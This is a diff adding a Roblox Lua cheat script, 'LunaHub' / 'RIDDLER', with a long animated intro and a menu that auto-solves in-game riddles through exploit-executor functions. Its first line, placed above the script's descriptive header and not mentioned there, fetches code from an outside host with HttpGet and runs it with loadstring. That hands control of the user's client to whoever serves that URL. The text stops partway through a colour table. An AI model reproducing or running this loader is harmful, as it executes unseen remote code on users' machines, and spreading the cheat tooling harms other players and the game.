@@ -1,0 +1,3295 @@
+loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=4k7p3c65"))()
+
+--[[
+    RIDDLER — unified build (with LUNAHUB intro)
+    ------------------------------------------------------------------
+    Flow:
+      1) LUNAHUB cinematic intro plays (tap-to-skip supported).
+      2) Intro tears itself down.
+      3) RIDDLER menu loads at the BOTTOM-CENTER of the screen,
+         resolves the notify remote, drops the
+         "LUNA AI RIDDLER BUYER" billboard above your head, and starts
+         listening for riddles.
+
+    Test tab   : solver controls + TEST SENDER popup
+    Feed tab   : ACE-style live console of every riddle + answer
+    Settings   : duo mode cycling, listen/ignore, UI size, COLORS
+    Billboard  : "LUNA AI RIDDLER BUYER" floats above your head
+    Auto-arm   : AI + LISTEN flip on when announcement contains "riddle"
+    Secure     : when a riddle has multiple valid answers, ALL are
+                 submitted in sequence (SECURE ANSWER 1-3)
+    Stop       : getgenv().StopRiddler()
+    Theme      : Dark blue with animated rain inside the GUI
+--]]
+
+-- ============================================================
+-- ============================================================
+--  PART 1 — INTRO (LUNAHUB) — runs first, then unlocks menu
+-- ============================================================
+-- ============================================================
+local introDone = false
+
+do
+    local HUB_NAME = "LunaHub"
+    local SUBTITLE = "PREMIUM RIDDLER EXPERIENCE"
+
+    local ACCENT = Color3.fromRGB(132, 58, 255)
+    local ACCENT_2 = Color3.fromRGB(218, 160, 255)
+    local BACKGROUND = Color3.fromRGB(4, 3, 9)
+
+    local INTRO_TIME = 5.2
+    local TAP_TO_SKIP = true
+
+    local ReplicatedFirst = game:GetService("ReplicatedFirst")
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+
+    ReplicatedFirst:RemoveDefaultLoadingScreen()
+
+    local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    local old = playerGui:FindFirstChild("ComplexHubIntro")
+    if old then
+        old:Destroy()
+    end
+
+    local finished = false
+    local closing = false
+    local renderConnection
+    local random = Random.new()
+
+    local function round(object, radius)
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, radius)
+        corner.Parent = object
+        return corner
+    end
+
+    local function outline(object, color, thickness, transparency)
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = color
+        stroke.Thickness = thickness
+        stroke.Transparency = transparency or 0
+        stroke.Parent = object
+        return stroke
+    end
+
+    local function addScale(object, value)
+        local scale = Instance.new("UIScale")
+        scale.Scale = value
+        scale.Parent = object
+        return scale
+    end
+
+    local function play(object, duration, goal, style, direction)
+        if finished or not object or not object.Parent then
+            return
+        end
+
+        local tween = TweenService:Create(
+            object,
+            TweenInfo.new(
+                duration,
+                style or Enum.EasingStyle.Quint,
+                direction or Enum.EasingDirection.Out
+            ),
+            goal
+        )
+
+        tween:Play()
+        return tween
+    end
+
+    local function waitTime(seconds)
+        local started = os.clock()
+
+        while not finished and os.clock() - started < seconds do
+            RunService.Heartbeat:Wait()
+        end
+
+        return not finished
+    end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "ComplexHubIntro"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.DisplayOrder = 100000
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = playerGui
+
+    local root = Instance.new("Frame")
+    root.Size = UDim2.fromScale(1, 1)
+    root.BackgroundColor3 = BACKGROUND
+    root.BorderSizePixel = 0
+    root.ClipsDescendants = true
+    root.Parent = gui
+
+    local backgroundGradient = Instance.new("UIGradient")
+    backgroundGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(2, 2, 6)),
+        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(17, 7, 31)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(2, 2, 6)),
+    })
+    backgroundGradient.Rotation = 20
+    backgroundGradient.Parent = root
+
+    local camera = workspace.CurrentCamera
+    while not camera or camera.ViewportSize.X < 20 do
+        RunService.RenderStepped:Wait()
+        camera = workspace.CurrentCamera
+    end
+
+    local view = camera.ViewportSize
+    local shortest = math.min(view.X, view.Y)
+    local uiScaleValue = math.clamp(shortest / 720, 0.72, 1.12)
+
+    local scene = Instance.new("Frame")
+    scene.Size = UDim2.fromScale(1, 1)
+    scene.BackgroundTransparency = 1
+    scene.Parent = root
+
+    local topPanel = Instance.new("Frame")
+    topPanel.Size = UDim2.fromScale(1, 0.5)
+    topPanel.BackgroundColor3 = Color3.fromRGB(3, 3, 8)
+    topPanel.BorderSizePixel = 0
+    topPanel.ZIndex = 500
+    topPanel.Parent = root
+
+    local bottomPanel = Instance.new("Frame")
+    bottomPanel.AnchorPoint = Vector2.new(0, 1)
+    bottomPanel.Position = UDim2.fromScale(0, 1)
+    bottomPanel.Size = UDim2.fromScale(1, 0.5)
+    bottomPanel.BackgroundColor3 = Color3.fromRGB(3, 3, 8)
+    bottomPanel.BorderSizePixel = 0
+    bottomPanel.ZIndex = 500
+    bottomPanel.Parent = root
+
+    local topEdge = Instance.new("Frame")
+    topEdge.AnchorPoint = Vector2.new(0, 1)
+    topEdge.Position = UDim2.fromScale(0, 1)
+    topEdge.Size = UDim2.new(1, 0, 0, 2)
+    topEdge.BackgroundColor3 = ACCENT
+    topEdge.BackgroundTransparency = 0.15
+    topEdge.BorderSizePixel = 0
+    topEdge.Parent = topPanel
+
+    local bottomEdge = topEdge:Clone()
+    bottomEdge.AnchorPoint = Vector2.new(0, 0)
+    bottomEdge.Position = UDim2.fromScale(0, 0)
+    bottomEdge.Parent = bottomPanel
+
+    local grid = Instance.new("Frame")
+    grid.Size = UDim2.fromScale(1, 1)
+    grid.BackgroundTransparency = 1
+    grid.ZIndex = 1
+    grid.Parent = scene
+
+    for i = 0, 18 do
+        local vertical = Instance.new("Frame")
+        vertical.Size = UDim2.new(0, 1, 1, 0)
+        vertical.Position = UDim2.fromScale(i / 18, 0)
+        vertical.BackgroundColor3 = ACCENT
+        vertical.BackgroundTransparency = 0.93
+        vertical.BorderSizePixel = 0
+        vertical.Parent = grid
+    end
+
+    for i = 0, 10 do
+        local horizontal = Instance.new("Frame")
+        horizontal.Size = UDim2.new(1, 0, 0, 1)
+        horizontal.Position = UDim2.fromScale(0, i / 10)
+        horizontal.BackgroundColor3 = ACCENT
+        horizontal.BackgroundTransparency = 0.94
+        horizontal.BorderSizePixel = 0
+        horizontal.Parent = grid
+    end
+
+    local particles = {}
+
+    for i = 1, 42 do
+        local particle = Instance.new("Frame")
+        local size = random:NextInteger(2, 5)
+
+        particle.AnchorPoint = Vector2.new(0.5, 0.5)
+        particle.Position = UDim2.fromScale(
+            random:NextNumber(0.03, 0.97),
+            random:NextNumber(0.03, 0.97)
+        )
+        particle.Size = UDim2.fromOffset(size, size)
+        particle.BackgroundColor3 = i % 5 == 0 and Color3.fromRGB(245, 240, 255) or ACCENT_2
+        particle.BackgroundTransparency = random:NextNumber(0.45, 0.85)
+        particle.BorderSizePixel = 0
+        particle.ZIndex = 2
+        particle.Parent = scene
+        round(particle, 999)
+
+        particles[i] = {
+            object = particle,
+            speed = random:NextNumber(0.008, 0.024),
+            offset = random:NextNumber(0, math.pi * 2),
+        }
+    end
+
+    local center = Instance.new("Frame")
+    center.AnchorPoint = Vector2.new(0.5, 0.5)
+    center.Position = UDim2.fromScale(0.5, 0.47)
+    center.Size = UDim2.fromOffset(430, 430)
+    center.BackgroundTransparency = 1
+    center.ZIndex = 20
+    center.Parent = scene
+
+    local centerScale = addScale(center, uiScaleValue * 0.72)
+
+    local glow = Instance.new("Frame")
+    glow.AnchorPoint = Vector2.new(0.5, 0.5)
+    glow.Position = UDim2.fromScale(0.5, 0.5)
+    glow.Size = UDim2.fromOffset(210, 210)
+    glow.BackgroundColor3 = ACCENT
+    glow.BackgroundTransparency = 0.9
+    glow.BorderSizePixel = 0
+    glow.ZIndex = 10
+    glow.Parent = center
+    round(glow, 999)
+
+    local ring1 = Instance.new("Frame")
+    ring1.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring1.Position = UDim2.fromScale(0.5, 0.5)
+    ring1.Size = UDim2.fromOffset(176, 176)
+    ring1.BackgroundTransparency = 1
+    ring1.Rotation = 0
+    ring1.ZIndex = 22
+    ring1.Parent = center
+    round(ring1, 999)
+    local ring1Stroke = outline(ring1, ACCENT_2, 3, 1)
+
+    local ring2 = Instance.new("Frame")
+    ring2.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring2.Position = UDim2.fromScale(0.5, 0.5)
+    ring2.Size = UDim2.fromOffset(126, 126)
+    ring2.BackgroundTransparency = 1
+    ring2.Rotation = 0
+    ring2.ZIndex = 23
+    ring2.Parent = center
+    round(ring2, 999)
+    local ring2Stroke = outline(ring2, ACCENT, 2, 1)
+
+    local ring3 = Instance.new("Frame")
+    ring3.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring3.Position = UDim2.fromScale(0.5, 0.5)
+    ring3.Size = UDim2.fromOffset(78, 78)
+    ring3.BackgroundColor3 = Color3.fromRGB(18, 8, 34)
+    ring3.BackgroundTransparency = 1
+    ring3.BorderSizePixel = 0
+    ring3.ZIndex = 24
+    ring3.Parent = center
+    round(ring3, 999)
+    local ring3Stroke = outline(ring3, ACCENT_2, 2, 1)
+
+    local core = Instance.new("Frame")
+    core.AnchorPoint = Vector2.new(0.5, 0.5)
+    core.Position = UDim2.fromScale(0.5, 0.5)
+    core.Size = UDim2.fromOffset(18, 18)
+    core.BackgroundColor3 = Color3.fromRGB(250, 247, 255)
+    core.BackgroundTransparency = 1
+    core.BorderSizePixel = 0
+    core.ZIndex = 25
+    core.Parent = center
+    round(core, 999)
+
+    local coreGlow = Instance.new("Frame")
+    coreGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+    coreGlow.Position = UDim2.fromScale(0.5, 0.5)
+    coreGlow.Size = UDim2.fromOffset(52, 52)
+    coreGlow.BackgroundColor3 = ACCENT
+    coreGlow.BackgroundTransparency = 1
+    coreGlow.BorderSizePixel = 0
+    coreGlow.ZIndex = 21
+    coreGlow.Parent = center
+    round(coreGlow, 999)
+
+    local orbitDots = {}
+
+    for i = 1, 8 do
+        local dot = Instance.new("Frame")
+        dot.AnchorPoint = Vector2.new(0.5, 0.5)
+        dot.Size = UDim2.fromOffset(i % 3 == 0 and 6 or 4, i % 3 == 0 and 6 or 4)
+        dot.BackgroundColor3 = i % 2 == 0 and ACCENT_2 or Color3.fromRGB(250, 247, 255)
+        dot.BackgroundTransparency = 1
+        dot.BorderSizePixel = 0
+        dot.ZIndex = 26
+        dot.Parent = center
+        round(dot, 999)
+
+        orbitDots[i] = dot
+    end
+
+    local scan = Instance.new("Frame")
+    scan.AnchorPoint = Vector2.new(0.5, 0.5)
+    scan.Position = UDim2.fromScale(0.5, 0)
+    scan.Size = UDim2.new(1, 0, 0, 90)
+    scan.BackgroundTransparency = 1
+    scan.BorderSizePixel = 0
+    scan.ZIndex = 8
+    scan.Parent = scene
+
+    local scanGradient = Instance.new("UIGradient")
+    scanGradient.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0.82),
+        NumberSequenceKeypoint.new(1, 1),
+    })
+    scanGradient.Color = ColorSequence.new(ACCENT)
+    scanGradient.Rotation = 90
+    scanGradient.Parent = scan
+
+    local titleHolder = Instance.new("Frame")
+    titleHolder.AnchorPoint = Vector2.new(0.5, 0.5)
+    titleHolder.Position = UDim2.fromScale(0.5, 0.69)
+    titleHolder.Size = UDim2.fromOffset(820, 120)
+    titleHolder.BackgroundTransparency = 1
+    titleHolder.ZIndex = 50
+    titleHolder.Parent = scene
+
+    local titleScale = addScale(titleHolder, uiScaleValue)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.fromScale(1, 0.58)
+    title.BackgroundTransparency = 1
+    title.Text = ""
+    title.TextColor3 = Color3.fromRGB(248, 246, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 43
+    title.TextTransparency = 0
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.TextYAlignment = Enum.TextYAlignment.Center
+    title.ZIndex = 51
+    title.Parent = titleHolder
+
+    local titleStroke = outline(title, ACCENT, 1, 0.68)
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.AnchorPoint = Vector2.new(0.5, 0)
+    subtitle.Position = UDim2.fromScale(0.5, 0.62)
+    subtitle.Size = UDim2.fromScale(1, 0.25)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = SUBTITLE
+    subtitle.TextColor3 = Color3.fromRGB(169, 150, 196)
+    subtitle.Font = Enum.Font.GothamMedium
+    subtitle.TextSize = 12
+    subtitle.TextTransparency = 1
+    subtitle.TextXAlignment = Enum.TextXAlignment.Center
+    subtitle.ZIndex = 51
+    subtitle.Parent = titleHolder
+
+    local progressBack = Instance.new("Frame")
+    progressBack.AnchorPoint = Vector2.new(0.5, 0.5)
+    progressBack.Position = UDim2.fromScale(0.5, 0.84)
+    progressBack.Size = UDim2.fromOffset(360, 7)
+    progressBack.BackgroundColor3 = Color3.fromRGB(37, 29, 49)
+    progressBack.BackgroundTransparency = 1
+    progressBack.BorderSizePixel = 0
+    progressBack.ClipsDescendants = true
+    progressBack.ZIndex = 52
+    progressBack.Parent = scene
+    round(progressBack, 999)
+
+    local progressFill = Instance.new("Frame")
+    progressFill.Size = UDim2.fromScale(0, 1)
+    progressFill.BackgroundColor3 = ACCENT
+    progressFill.BorderSizePixel = 0
+    progressFill.ZIndex = 53
+    progressFill.Parent = progressBack
+    round(progressFill, 999)
+
+    local progressGradient = Instance.new("UIGradient")
+    progressGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, ACCENT),
+        ColorSequenceKeypoint.new(0.62, ACCENT_2),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
+    })
+    progressGradient.Parent = progressFill
+
+    local percent = Instance.new("TextLabel")
+    percent.AnchorPoint = Vector2.new(0.5, 0.5)
+    percent.Position = UDim2.fromScale(0.5, 0.89)
+    percent.Size = UDim2.fromOffset(100, 24)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.TextColor3 = Color3.fromRGB(158, 139, 184)
+    percent.TextTransparency = 1
+    percent.Font = Enum.Font.GothamMedium
+    percent.TextSize = 11
+    percent.ZIndex = 52
+    percent.Parent = scene
+
+    local status = Instance.new("TextLabel")
+    status.AnchorPoint = Vector2.new(0.5, 0.5)
+    status.Position = UDim2.fromScale(0.5, 0.93)
+    status.Size = UDim2.fromOffset(300, 22)
+    status.BackgroundTransparency = 1
+    status.Text = "Preparing interface"
+    status.TextColor3 = Color3.fromRGB(132, 116, 154)
+    status.TextTransparency = 1
+    status.Font = Enum.Font.GothamMedium
+    status.TextSize = 10
+    status.ZIndex = 52
+    status.Parent = scene
+
+    local skipButton = Instance.new("TextButton")
+    skipButton.Size = UDim2.fromScale(1, 1)
+    skipButton.BackgroundTransparency = 1
+    skipButton.Text = ""
+    skipButton.AutoButtonColor = false
+    skipButton.ZIndex = 1000
+    skipButton.Parent = root
+
+    local skipText = Instance.new("TextLabel")
+    skipText.AnchorPoint = Vector2.new(0.5, 1)
+    skipText.Position = UDim2.new(0.5, 0, 1, -22)
+    skipText.Size = UDim2.fromOffset(180, 22)
+    skipText.BackgroundTransparency = 1
+    skipText.Text = "tap to skip"
+    skipText.TextColor3 = Color3.fromRGB(145, 132, 163)
+    skipText.TextTransparency = TAP_TO_SKIP and 0.28 or 1
+    skipText.Font = Enum.Font.GothamMedium
+    skipText.TextSize = 11
+    skipText.ZIndex = 1001
+    skipText.Parent = root
+
+    local flash = Instance.new("Frame")
+    flash.Size = UDim2.fromScale(1, 1)
+    flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    flash.BackgroundTransparency = 1
+    flash.BorderSizePixel = 0
+    flash.ZIndex = 900
+    flash.Parent = root
+
+    local function closeIntro()
+        if closing then
+            return
+        end
+
+        closing = true
+        finished = true
+
+        if renderConnection then
+            renderConnection:Disconnect()
+        end
+
+        TweenService:Create(
+            flash,
+            TweenInfo.new(0.07, Enum.EasingStyle.Linear),
+            {BackgroundTransparency = 0.12}
+        ):Play()
+
+        task.wait(0.07)
+
+        TweenService:Create(
+            topPanel,
+            TweenInfo.new(0.65, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut),
+            {Position = UDim2.fromScale(0, -0.5)}
+        ):Play()
+
+        TweenService:Create(
+            bottomPanel,
+            TweenInfo.new(0.65, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut),
+            {Position = UDim2.fromScale(0, 1.5)}
+        ):Play()
+
+        TweenService:Create(
+            flash,
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad),
+            {BackgroundTransparency = 1}
+        ):Play()
+
+        TweenService:Create(
+            root,
+            TweenInfo.new(0.65, Enum.EasingStyle.Quad),
+            {BackgroundTransparency = 1}
+        ):Play()
+
+        task.wait(0.68)
+
+        pcall(function()
+            player:SetAttribute("HubIntroFinished", true)
+        end)
+        gui:Destroy()
+
+        introDone = true
+    end
+
+    if TAP_TO_SKIP then
+        skipButton.Activated:Connect(closeIntro)
+    else
+        skipButton.Active = false
+    end
+
+    renderConnection = RunService.RenderStepped:Connect(function(dt)
+        if finished then
+            return
+        end
+
+        ring1.Rotation += 24 * dt
+        ring2.Rotation -= 38 * dt
+        backgroundGradient.Rotation += 2 * dt
+        progressGradient.Rotation += 22 * dt
+
+        local time = os.clock()
+
+        glow.Size = UDim2.fromOffset(
+            210 + math.sin(time * 2.5) * 16,
+            210 + math.sin(time * 2.5) * 16
+        )
+
+        coreGlow.Size = UDim2.fromOffset(
+            52 + math.sin(time * 4.8) * 7,
+            52 + math.sin(time * 4.8) * 7
+        )
+
+        for i, dot in ipairs(orbitDots) do
+            local radius = i % 2 == 0 and 88 or 62
+            local speed = i % 2 == 0 and 0.62 or -0.86
+            local angle = time * speed + (math.pi * 2 / #orbitDots) * i
+
+            dot.Position = UDim2.fromOffset(
+                215 + math.cos(angle) * radius,
+                215 + math.sin(angle) * radius
+            )
+        end
+
+        for i, particleData in ipairs(particles) do
+            local particle = particleData.object
+            local x = particle.Position.X.Scale
+            local y = particle.Position.Y.Scale - particleData.speed * dt
+
+            if y < -0.03 then
+                y = 1.03
+                x = random:NextNumber(0.03, 0.97)
+            end
+
+            particle.Position = UDim2.fromScale(
+                x + math.sin(time + particleData.offset) * 0.00015,
+                y
+            )
+        end
+    end)
+
+    task.spawn(function()
+        play(
+            topPanel,
+            0.7,
+            {Position = UDim2.fromScale(0, -0.5)},
+            Enum.EasingStyle.Quint,
+            Enum.EasingDirection.InOut
+        )
+
+        play(
+            bottomPanel,
+            0.7,
+            {Position = UDim2.fromScale(0, 1.5)},
+            Enum.EasingStyle.Quint,
+            Enum.EasingDirection.InOut
+        )
+
+        if not waitTime(0.38) then
+            return
+        end
+
+        play(centerScale, 0.75, {Scale = uiScaleValue}, Enum.EasingStyle.Back)
+        play(ring1Stroke, 0.45, {Transparency = 0.15})
+        play(ring2Stroke, 0.52, {Transparency = 0.22})
+        play(ring3, 0.4, {BackgroundTransparency = 0.08})
+        play(ring3Stroke, 0.45, {Transparency = 0.08})
+        play(core, 0.38, {BackgroundTransparency = 0})
+        play(coreGlow, 0.38, {BackgroundTransparency = 0.78})
+
+        for i, dot in ipairs(orbitDots) do
+            task.delay(i * 0.045, function()
+                play(dot, 0.24, {BackgroundTransparency = 0.05})
+            end)
+        end
+
+        play(
+            scan,
+            1.1,
+            {Position = UDim2.fromScale(0.5, 1)},
+            Enum.EasingStyle.Linear
+        )
+
+        if not waitTime(0.52) then
+            return
+        end
+
+        for i = 1, #HUB_NAME do
+            if finished then
+                return
+            end
+
+            title.Text = string.sub(HUB_NAME, 1, i)
+
+            if string.sub(HUB_NAME, i, i) ~= " " then
+                play(core, 0.07, {Size = UDim2.fromOffset(23, 23)})
+                task.delay(0.07, function()
+                    play(core, 0.1, {Size = UDim2.fromOffset(18, 18)})
+                end)
+            end
+
+            task.wait(0.035)
+        end
+
+        play(subtitle, 0.32, {TextTransparency = 0})
+        play(progressBack, 0.3, {BackgroundTransparency = 0.12})
+        play(percent, 0.3, {TextTransparency = 0})
+        play(status, 0.3, {TextTransparency = 0})
+
+        if not waitTime(0.28) then
+            return
+        end
+
+        local loadStart = os.clock()
+        local loadDuration = math.max(1.3, INTRO_TIME - 2.4)
+
+        play(
+            progressFill,
+            loadDuration,
+            {Size = UDim2.fromScale(1, 1)},
+            Enum.EasingStyle.Quart,
+            Enum.EasingDirection.InOut
+        )
+
+        while not finished do
+            local progress = math.clamp((os.clock() - loadStart) / loadDuration, 0, 1)
+            local value = math.floor(progress * 100)
+
+            percent.Text = value .. "%"
+
+            if value < 30 then
+                status.Text = "Preparing interface"
+            elseif value < 65 then
+                status.Text = "Loading modules"
+            elseif value < 92 then
+                status.Text = "Finalizing"
+            else
+                status.Text = "Ready"
+            end
+
+            if progress >= 1 then
+                break
+            end
+
+            RunService.RenderStepped:Wait()
+        end
+
+        if finished then
+            return
+        end
+
+        percent.Text = "100%"
+        status.Text = "Ready"
+
+        play(flash, 0.06, {BackgroundTransparency = 0.12}, Enum.EasingStyle.Linear)
+        play(centerScale, 0.15, {Scale = uiScaleValue * 1.12})
+        play(titleScale, 0.15, {Scale = uiScaleValue * 1.04})
+
+        if not waitTime(0.07) then
+            return
+        end
+
+        play(flash, 0.25, {BackgroundTransparency = 1}, Enum.EasingStyle.Quad)
+        play(centerScale, 0.22, {Scale = uiScaleValue})
+        play(titleScale, 0.22, {Scale = uiScaleValue})
+
+        if not waitTime(0.25) then
+            return
+        end
+
+        topPanel.Position = UDim2.fromScale(0, -0.5)
+        bottomPanel.Position = UDim2.fromScale(0, 1.5)
+
+        play(topPanel, 0.48, {Position = UDim2.fromScale(0, 0)})
+        play(bottomPanel, 0.48, {Position = UDim2.fromScale(0, 1)})
+
+        if not waitTime(0.45) then
+            return
+        end
+
+        closeIntro()
+    end)
+end
+
+-- Wait for the intro to finish (safety timeout of 20s in case something stalls)
+local introWaitStart = os.clock()
+repeat
+    task.wait(0.05)
+until introDone or (os.clock() - introWaitStart > 20)
+
+-- ============================================================
+-- ============================================================
+--  PART 2 — RIDDLER (opens after the intro, bottom-center)
+-- ============================================================
+-- ============================================================
+
+local cloneref = cloneref or function(o) return o end
+
+local Players = cloneref(game:GetService("Players"))
+local RS      = cloneref(game:GetService("ReplicatedStorage"))
+local UIS     = cloneref(game:GetService("UserInputService"))
+local TS      = cloneref(game:GetService("TweenService"))
+local HS      = cloneref(game:GetService("HttpService"))
+local CoreGui = cloneref(game:GetService("CoreGui"))
+local RunService = cloneref(game:GetService("RunService"))
+
+local LP = Players.LocalPlayer
+if not LP then Players:GetPropertyChangedSignal("LocalPlayer"):Wait(); LP = Players.LocalPlayer end
+local PG = LP:WaitForChild("PlayerGui")
+
+local getupvalues = (debug and (debug.getupvalues or debug.getupvalue)) or getupvalues
+local getconns    = getconnections or (debug and debug.getconnections)
+local httpRequest = (syn and syn.request) or http_request or request or (http and http.request)
+local env = typeof(getgenv) == "function" and getgenv() or _G
+
+if env.StopRiddler then pcall(env.StopRiddler) end
+
+-- ============================================================
+-- UTILS
+-- ============================================================
+local FR, FM, FB, FBK = Enum.Font.Gotham, Enum.Font.GothamMedium, Enum.Font.GothamBold, Enum.Font.GothamBlack
+
+local function new(cls, props, parent)
+    local o = Instance.new(cls)
+    for k, v in pairs(props or {}) do o[k] = v end
+    if parent then o.Parent = parent end
+    return o
+end
+local function corner(o, r)
+    return new("UICorner", { CornerRadius = UDim.new(0, r or 6) }, o)
+end
+local function stroke(o, col, th, tr)
+    return new("UIStroke", { Color = col or Color3.fromRGB(30,60,120), Thickness = th or 1, Transparency = tr or 0, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, o)
+end
+local function gradient(o, c1, c2, rot)
+    return new("UIGradient", { Color = ColorSequence.new(c1, c2), Rotation = rot or 90 }, o)
+end
+local function tween(o, t, goal, style)
+    TS:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quad), goal):Play()
+end
+local function label(text, size, col, font, xa, parent)
+    return new("TextLabel", {
+        BackgroundTransparency = 1, Text = text, Font = font or FM, TextSize = size or 10,
+        TextColor3 = col or Color3.fromRGB(200,220,255),
+        TextXAlignment = xa or Enum.TextXAlignment.Left,
+    }, parent)
+end
+local function drag(handle, target)
+    local d, ds, sp
+    handle.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            d, ds, sp = true, i.Position, target.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then d = false end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(i)
+        if d and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local delta = i.Position - ds
+            target.Position = UDim2.new(sp.X.Scale, sp.X.Offset + delta.X, sp.Y.Scale, sp.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+local function stripRich(s)
+    if type(s) ~= "string" then return tostring(s) end
+    return (s:gsub("<[^>]->", ""))
+end
+local function trim(s)
+    return (s or ""):gsub("^%s+", ""):gsub("%s+$", "")
+end
+
+-- ============================================================
+-- THEME — DARK BLUE (default)
+-- ============================================================
+local C = {
+    bg         = Color3.fromRGB(6,   10,  22),
+    bgDeep     = Color3.fromRGB(2,   4,   10),
+    header     = Color3.fromRGB(10,  18,  38),
+    panel      = Color3.fromRGB(14,  24,  48),
+    panel2     = Color3.fromRGB(20,  34,  64),
+    input      = Color3.fromRGB(6,   12,  26),
+    row        = Color3.fromRGB(12,  20,  42),
+    rowHi      = Color3.fromRGB(18,  30,  58),
+    line       = Color3.fromRGB(40,  90,  180),
+    lineSoft   = Color3.fromRGB(30,  60,  120),
+    acc        = Color3.fromRGB(40,  110, 220),
+    acc2       = Color3.fromRGB(20,  70,  160),
+    accHi      = Color3.fromRGB(100, 170, 255),
+    txt        = Color3.fromRGB(200, 220, 255),
+    sub        = Color3.fromRGB(110, 140, 190),
+    dim        = Color3.fromRGB(70,  90,  130),
+    ok         = Color3.fromRGB(80,  200, 140),
+    err        = Color3.fromRGB(240, 100, 110),
+    warn       = Color3.fromRGB(240, 190, 90),
+    toggleOff  = Color3.fromRGB(25,  40,  70),
+    rain       = Color3.fromRGB(60,  140, 255),
+}
+local RICH = {
+    Dim   = "rgb(70,90,130)",
+    Amber = "rgb(240,190,90)",
+    Green = "rgb(80,200,140)",
+    Red   = "rgb(240,100,110)",
+    Cyan  = "rgb(80,180,240)",
+    Purp  = "rgb(100,170,255)",
+    White = "rgb(210,225,255)",
+}
+
+local PALETTES = {
+    BLUE = {
+        bg         = Color3.fromRGB(6,   10,  22),
+        bgDeep     = Color3.fromRGB(2,   4,   10),
+        header     = Color3.fromRGB(10,  18,  38),
+        panel      = Color3.fromRGB(14,  24,  48),
+        panel2     = Color3.fromRGB(20,  34,  64),
+        input      = Color3.fromRGB(6,   12,  26),
+        row        = Color3.fromRGB(12,  20,  42),
+        rowHi      = Color3.fromRGB(18,  30,  58),
+        line       = Color3.fromRGB(40,  90,  180),
+        lineSoft   = Color3.fromRGB(30,  60,  120),
+        acc        = Color3.fromRGB(40,  110, 220),
+        acc2       = Color3.fromRGB(20,  70,  160),
+        accHi      = Color3.fromRGB(100, 170, 255),
+        txt        = Color3.fromRGB(200, 220, 255),
+        sub        = Color3.fromRGB(110, 140, 190),
+        dim        = Color3.fromRGB(70,  90,  130),
+        toggleOff  = Color3.fromRGB(25,  40,  70),
+        rain       = Color3.fromRGB(60,  140, 255),
+        rich       = { Dim = "rgb(70,90,130)", Amber = "rgb(240,190,90)", Green = "rgb(80,200,140)", Red = "rgb(240,100,110)", Cyan = "rgb(80,180,240)", Purp = "rgb(100,170,255)", White = "rgb(210,225,255)" },
+    },
+    RED = {
+        bg         = Color3.fromRGB(22, 6,   8),
+        bgDeep     = Color3.fromRGB(10, 2,   4),
+        header     = Color3.fromRGB(38, 10,  14),
+        panel      = Color3.fromRGB(48, 14,  20),
+        panel2     = Color3.fromRGB(64, 20,  28),
+        input      = Color3.fromRGB(26, 6,   10),
+        row        = Color3.fromRGB(42, 12,  18),
+        rowHi      = Color3.fromRGB(58, 18,  26),
+        line       = Color3.fromRGB(180, 40,  60),
+        lineSoft   = Color3.fromRGB(120, 30,  45),
+        acc        = Color3.fromRGB(220, 40,  60),
+        acc2       = Color3.fromRGB(160, 20,  40),
+        accHi      = Color3.fromRGB(255, 100, 120),
+        txt        = Color3.fromRGB(255, 200, 210),
+        sub        = Color3.fromRGB(190, 110, 130),
+        dim        = Color3.fromRGB(130, 70,  85),
+        toggleOff  = Color3.fromRGB(70,  25,  35),
+        rain       = Color3.fromRGB(255, 60,  90),
+        rich       = { Dim = "rgb(130,70,85)", Amber = "rgb(240,190,90)", Green = "rgb(80,200,140)", Red = "rgb(240,100,110)", Cyan = "rgb(80,180,240)", Purp = "rgb(255,100,120)", White = "rgb(255,200,210)" },
+    },
+    GREEN = {
+        bg         = Color3.fromRGB(6,   18,  10),
+        bgDeep     = Color3.fromRGB(2,   10,  4),
+        header     = Color3.fromRGB(10,  34,  18),
+        panel      = Color3.fromRGB(14,  46,  24),
+        panel2     = Color3.fromRGB(20,  62,  34),
+        input      = Color3.fromRGB(6,   22,  12),
+        row        = Color3.fromRGB(12,  40,  20),
+        rowHi      = Color3.fromRGB(18,  56,  30),
+        line       = Color3.fromRGB(40,  180, 90),
+        lineSoft   = Color3.fromRGB(30,  120, 60),
+        acc        = Color3.fromRGB(40,  200, 100),
+        acc2       = Color3.fromRGB(20,  140, 70),
